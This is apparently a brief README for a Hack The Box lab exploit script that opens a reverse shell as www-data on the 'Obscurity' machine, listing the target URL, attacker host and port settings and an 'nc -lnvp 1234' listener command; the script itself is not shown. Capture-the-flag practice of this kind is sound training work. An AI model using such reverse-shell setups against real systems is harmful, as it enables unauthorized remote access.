Obscurity HTB quick shell for www-data
=============
With you can easily gain access as www-data to the "obcurity" HTB box.  

Change the IP in the script:
``` 
url='http://10.10.10.168:8080/' 
lhost = '10.10.14.x' #change this
lport = '1234' 
``` 
And set up a listener with nc:
```
nc -lnvp 1234
```
There you go!
Happy hacking!
